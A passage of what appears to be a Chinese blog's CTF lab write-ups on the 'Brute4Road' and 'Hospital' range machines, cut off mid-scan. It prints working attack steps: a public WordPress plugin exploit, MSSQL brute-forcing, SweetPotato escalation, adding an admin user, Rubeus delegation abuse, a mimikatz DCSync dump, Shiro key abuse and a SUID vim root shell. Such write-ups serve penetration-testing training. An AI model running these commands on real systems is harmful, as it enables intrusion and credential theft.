233\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:88\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:80\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:80\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:80\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:22\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:22\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:21\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:139\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:139\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:135\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:135\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:139\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:135\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:445\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:445\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:445\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:445\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:389\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:139\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:1433\n[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:6379\n[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.18:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:22 => [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\n[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:21 => [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]\n[2025-04-15 15:23:09] [SUCCESS] 服务识别 172.22.2.3:88 => \n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:80 => [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows\n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.7:80 => [http] 版本:1.20.1 产品:nginx\n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:139 =>  Banner:[.]\n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:139 =>  Banner:[.]\n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.18:80 => [http]\n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:445 => \n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:445 => \n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:445 => \n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name\n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:139 =>  Banner:[.]\n[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:1433 => [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]\n[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:139 => \n[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:445 => \n[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.7:6379 => \n[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.34:135 => \n[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.16:135 => \n[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.3:135 => \n[2025-04-15 15:24:10] [INFO] 存活端口数量: 21\n[2025-04-15 15:24:10] [INFO] 开始漏洞扫描\n[2025-04-15 15:24:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.2.34\n主机名: CLIENT01\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.2.34\n[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.2.3\n主机名: DC\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.2.3\n[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.2.16\n主机名: MSSQLSERVER\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.2.16\n[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]\n[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.34     XIAORANG\\CLIENT01             \n[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found\n[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS\n[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393\n[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393\n[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]\n[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\\UBUNTU-WEB02        \n[2025-04-15 15:24:10] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable\n[2025-04-15 15:24:10] [SUCCESS] 匿名登录成功!\n[2025-04-15 15:24:10] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456\n[2025-04-15 15:24:10] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]\n[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点\n[2025-04-15 15:24:12] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]\n[2025-04-15 15:24:18] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456\n\n~~~\n\n扫到一堆哦一个一个看，172.22.2.18的80端口是一个wps，用wpscan扫一下\n\n~~~\n[i] Plugin(s) Identified:\n\n[+] wpcargo\n | Location: http://172.22.2.18/wp-content/plugins/wpcargo/\n | Last Updated: 2024-08-08T17:00:00.000Z\n | [!] The version is out of date, the latest version is 7.0.6\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | [!] 6 vulnerabilities identified:\n |\n | [!] toc: true\ntitle: WPCargo < 6.9.0 - Unauthenticated RCE\n |     Fixed in: 6.9.0\n |     References:\n |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace < 6.9.5 - Reflected Cross Site Scripting\n |     Fixed in: 6.9.5\n |     References:\n |      - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace < 6.9.5 - Admin+ Stored Cross Site Scripting\n |     Fixed in: 6.9.5\n |     References:\n |      - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace <= 7.0.6 - Unauthenticated SQL Injection\n |     References:\n |      - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0e725ec0-4897-4ba7-a803-80e8aafacbd1\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace <= 7.0.6 - Missing authorization to Authenticated (Subscriber+) Settings Update\n |     References:\n |      - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0c467a78-1ba4-4c0d-84e6-db54fc1b0c63\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace <= 7.0.6 - Authenticated (Contributor+) Insecure Direct Object Reference\n |     References:\n |      - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/887ecedb-0bc8-4488-b6fa-27cfa22345e6\n |\n | Version: 6.x.x (80% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt\n~~~\n\n存在wpcargo插件，有一个rce的漏洞https://github.com/biulove0x/CVE-2021-25003\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# python3 2 -t \"http://172.22.2.18/\"\n[proxychains] DLL init: proxychains-ng 4.17\n\n############################################\n# @author : biulove0x                      #\n# @name   : WP Plugins WPCargo Exploiter   #\n# @cve    : CVE-2021-25003                 #\n############################################\n\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.2.18:80  ...  OK\n[-] http://172.22.2.18/wp-content/wp-conf.php => Uploaded!\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road1.png)\n\n蚁剑连接，可以拿到数据库的密码\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road2.png)\n\nflag2在数据库里\n\n# FLAG3\n\n在另一张表里有很多密码\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road3.png)\n\n是172.22.2.16 msssql数据库的密码本，然后动手爆破，mssql的默认用户名是`sa`，因为导出来的有空格，所以把前面的空格处理掉\n\n~~~\n└─# grep -P \"\\w+\" pass -o >2\n~~~\n\n~~~\n└─# hydra -l sa -P pass 172.22.2.16 mssql -f -I -vV\n[1433][mssql] host: 172.22.2.16   login: sa   password: ElGNkOiC\n~~~\n\n然后用MDUT连接\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road4.png)\n\n上传[sweetpotato.exe](https://github.com/uknowsec/SweetPotato?tab=readme-ov-file)然后提权\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road5.png)\n\nflag03在C:\\Users\\Administrator\\flag\\下\n\n~~~\nC:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a \"type C:\\Users\\Administrator\\flag\\flag03.txt\"\n~~~\n\n# FLAG4\n\nnetstat -ano发现开启了3389\n\n~~~\nTCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\n\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       692\n\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n\n  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2680\n\n  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       2932\n\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       812\n\n~~~\n\n添加一个用户\n\n~~~\nC:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a \"net user lv Asd123123 /add\"\nC:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a \"net localgroup administrators lv /add\"\n~~~\n\n然后远程桌面登录\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road6.png)\n\n可以发现有域环境，先上传mimikatz提取hash，上传bloodhound可以发现有约束性委派\n\n获取到域用户的哈希为cea3e66a2715c71423e7d3f0ff6cd352\n\n通过Rubeus申请机器账户MSSQLSERVER的TGT，执行后，将得到 Base64 加密后的 TGT 票据\n\n```\nRubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap\n```\n\n然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中\n\n~~~\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:[base64(ticket.kirbi)]\n~~~\n\nLDAP服务具有DCSync权限，可以导出域内用户哈希\n\n```\nmimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /user:Administrator\" exit\n```\n\n得到域管的哈希为1a19251fbd935969832616366ae3fe62\n\n然后就可以用WMI服务登录域控，flag在C:\\Users\\Administrator\\flag下\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"春秋云镜-Hospital","url":"/2025/04/10/春秋云镜-Hospital/","content":"\n# flag01\n\n首先扫描一下端口，有一个22端口和8080端口，然后用fscan对这两个端口进行扫描，可以扫到一个heapdump泄露\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ../pentest/fscan/fscan -h 39.99.232.64 -p 8080\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.8.4\nstart infoscan\n39.99.232.64:8080 open\n[*] alive ports len is: 1\nstart vulscan\n[*] WebTitle http://39.99.232.64:8080  code:302 len:0      toc: true\ntitle:None 跳转url: http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD\n[*] WebTitle http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD code:200 len:2005   toc: true\ntitle:医疗管理后台\n[+] PocScan http://39.99.232.64:8080 poc-yaml-spring-actuator-heapdump-file\n已完成 1/1\n[*] 扫描结束,耗时: 6.890674118s\n~~~\n\n访问/actuator/heapdump，奖heapdump下载下了，然后用JDumpSpider分析\n\n~~~\nE:\\CTF\\heapdump via ☕ v17.0.11\n❯ java -jar .\\JDumpSpider-1.1-SNAPSHOT-full.jar .\\heapdump\n===========================================\nSpringDataSourceProperties\n-------------\nnot found!\n\n===========================================\nWeblogicDataSourceConnectionPoolConfig\n-------------\nnot found!\n\n===========================================\nMongoClient\n-------------\nnot found!\n\n===========================================\nAliDruidDataSourceWrapper\n-------------\nnot found!\n\n===========================================\nHikariDataSource\n-------------\nnot found!\n\n===========================================\nRedisStandaloneConfiguration\n-------------\nnot found!\n\n===========================================\nJedisClient\n-------------\nnot found!\n\n===========================================\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES\n\n===========================================\nOriginTrackedMapPropertySource\n-------------\nmanagement.endpoints.web.exposure.include = *\nserver.port = 8080\nspring.thymeleaf.prefix = classpath:/templates/\n\n===========================================\nMutablePropertySources\n-------------\nawt.toolkit = sun.awt.X11.XToolkit\nsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\njava.protocol.handler.pkgs = org.springframework.boot.loader\nsun.management.compiler = HotSpot 64-Bit Tiered Compilers\nsun.cpu.isalist =\nsun.jnu.encoding = UTF-8\njava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08\njava.class.path = /app/login-1.0-SNAPSHOT.jar\npath.separator = :\njava.vm.vendor = Private Build\nos.version = 5.4.0-164-generic\njava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\njava.runtime.name = OpenJDK Runtime Environment\nfile.encoding = UTF-8\ncatalina.useNaming = false\nspring.beaninfo.ignore = true\njava.vm.specification.version = 1.8\nos.name = Linux\njava.vm.name = OpenJDK 64-Bit Server VM\nlocal.server.port = null\nuser.country = US\njava.vendor.url.bug = http://bugreport.sun.com/bugreport/\nsun.java.command = /app/login-1.0-SNAPSHOT.jar\njava.io.tmpdir = /tmp\ncatalina.home = /tmp/tomcat.5978727065775558529.8080\njava.version = 1.8.0_392\nuser.home = /home/app\nuser.language = en\nPID = 750\njava.awt.printerjob = sun.print.PSPrinterJob\nfile.separator = /\ncatalina.base = /tmp/tomcat.5978727065775558529.8080\njava.vm.info = mixed mode\njava.specification.name = Java Platform API Specification\njava.vm.specification.vendor = Oracle Corporation\njava.awt.graphicsenv = sun.awt.X11GraphicsEnvironment\njava.awt.headless = true\nsun.io.unicode.encoding = UnicodeLittle\njava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\n\n===========================================\nMapPropertySources\n-------------\nlocal.server.port = null\n\n===========================================\nConsulPropertySources\n-------------\nnot found!\n\n===========================================\nJavaProperties\n-------------\njava.util.logging.FileHandler.pattern = %h/java%u.log\nawt.toolkit = sun.awt.X11.XToolkit\nsun.cpu.isalist =\nsun.jnu.encoding = UTF-8\nsun.arch.data.model = 64\ncatalina.useNaming = false\nsecurity.overridePropertiesFile = true\nsun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64\nsecurity.provider.7 = com.sun.security.sasl.Provider\nsun.java.command = /app/login-1.0-SNAPSHOT.jar\nsecurity.provider.9 = sun.security.smartcardio.SunPCSC\njava.specification.vendor = Oracle Corporation\nsecurity.provider.1 = sun.security.provider.Sun\nsecurity.provider.2 = sun.security.rsa.SunRsaSign\nsecurity.provider.3 = sun.security.ec.SunEC\nnetworkaddress.cache.negative.ttl = 10\nsecurity.provider.4 = com.sun.net.ssl.internal.ssl.Provider\nsecurity.provider.5 = com.sun.crypto.provider.SunJCE\nsecurity.provider.6 = sun.security.jgss.SunProvider\nfile.separator = /\norg.springframework.web.servlet.HandlerExceptionResolver = org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver,org.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver,org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver\njava.specification.name = Java Platform API Specification\njava.vm.specification.vendor = Oracle Corporation\norg.springframework.web.servlet.HandlerMapping = org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,org.springframework.web.servlet.function.support.RouterFunctionMapping\norg.springframework.web.servlet.HandlerAdapter = org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter,org.springframework.web.servlet.function.support.HandlerFunctionAdapter\norg.springframework.web.servlet.FlashMapManager = org.springframework.web.servlet.support.SessionFlashMapManager\npackage.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.\nsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\njava.protocol.handler.pkgs = org.springframework.boot.loader\nsun.management.compiler = HotSpot 64-Bit Tiered Compilers\norg.springframework.web.servlet.ThemeResolver = org.springframework.web.servlet.theme.FixedThemeResolver\njava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08\nuser.name = app\npolicy.url.1 = file:${java.home}/lib/security/java.policy\nsecurerandom.source = file:/dev/random\npolicy.url.2 = file:${user.home}/.java.policy\njdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize < 1024, EC keySize < 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves\npolicy.ignoreIdentityScope = false\nfile.encoding = UTF-8\njava.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter\njdk.sasl.disabledMechanisms =\njava.io.tmpdir = /tmp\norg.springframework.web.servlet.ViewResolver = org.springframework.web.servlet.view.InternalResourceViewResolver\njava.version = 1.8.0_392\njava.vm.specification.name = Java Virtual Machine Specification\njdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37\nPID = 750\njava.awt.printerjob = sun.print.PSPrinterJob\njdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops\njava.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib\njava.vendor = Private Build\njava.specification.maintenance.version = 5\nhandlers = java.util.logging.ConsoleHandler\nsun.io.unicode.encoding = UnicodeLittle\nkrb5.kdc.bad.policy = tryLast\njava.class.path = /app/login-1.0-SNAPSHOT.jar\njava.vm.vendor = Private Build\njdk.security.legacyAlgorithms = SHA1, RSA keySize < 2048, DSA keySize < 2048\njdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1\ncrypto.policy = unlimited\njceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*\nlogin.configuration.provider = sun.security.provider.ConfigFile\nuser.timezone =\njava.vm.specification.version = 1.8\nos.name = Linux\nuser.country = US\njdk.security.caDistrustPolicies = SYMANTEC_TLS\nsun.cpu.endian = little\nuser.home = /home/app\nuser.language = en\nen = UTF-8\njdk.tls.alpnCharset = ISO_8859_1\nssl.KeyManagerFactory.algorithm = SunX509\n.level = INFO\njava.awt.graphicsenv = sun.awt.X11GraphicsEnvironment\njava.awt.headless = true\ncom.xyz.foo.level = SEVERE\npolicy.provider = sun.security.provider.PolicyFile\npath.separator = :\nfr = UTF-8\nos.version = 5.4.0-164-generic\njava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\njava.runtime.name = OpenJDK Runtime Environment\nkeystore.type.compat = true\norg.springframework.web.servlet.RequestToViewNameTranslator = org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator\nspring.beaninfo.ignore = true\njava.vm.name = OpenJDK 64-Bit Server VM\njava.vendor.url.bug = http://bugreport.sun.com/bugreport/\njava.util.logging.FileHandler.formatter = java.util.logging.XMLFormatter\njava.util.logging.FileHandler.count = 1\ncatalina.home = /tmp/tomcat.5978727065775558529.8080\nsun.cds.enableSharedLookupCache = false\nsun.security.krb5.maxReferrals = 5\ncatalina.base = /tmp/tomcat.5978727065775558529.8080\njava.util.logging.FileHandler.limit = 50000\njava.vm.info = mixed mode\nkeystore.type = jks\njava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\npolicy.expandProperties = true\nsecurerandom.strongAlgorithms = NativePRNGBlocking:SUN\n\n===========================================\nProcessEnvironment\n-------------\nnot found!\n\n===========================================\nOSS\n-------------\nnot found!\n\n===========================================\nUserPassSearcher\n-------------\norg.apache.shiro.web.filter.authc.FormAuthenticationFilter:\n[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]\n\norg.apache.catalina.startup.Tomcat:\n[hostname = localhost]\n\n\n===========================================\nCookieThief\n-------------\nnot found!\n\n===========================================\nAuthThief\n-------------\nnot found!\n\n===========================================\n~~~\n\n有一个shirokey\n\n~~~\nalgMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES\n~~~\n\n用shiro工具注入内存马,冰蝎连接即可\n\nvim.basic存在suid权限\n\n~~~\napp@web01:~$ find / -perm -u=s -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\n\n/usr/bin/vim.basic\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/staprun\n/usr/bin/at\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/stapbpf\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/fusermount\n/usr/bin/mount\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n~~~\n\n系统存在python3环境， 参考https://gtfobins.github.io/gtfobins/vim/ 提权，flag01在/root/flag下\n\n~~~\n/usr/bin/vim.basic -c ':python3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n~~~\n\n# flag02\n\n然后搭建一个代理隧道，上传一个fscan开始扫描\n\n~~~\nip a   \n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:0d:aa:83 brd ff:ff:ff:ff:ff:ff\n    inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0\n       valid_lft 315357949sec preferred_lft 315357949sec\n    inet6 fe80::216:3eff:fe0d:aa83/64 scope link \n       valid_lft forever preferred_lft forever\n       \n       ./fscan -h 172.30.12.1/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ 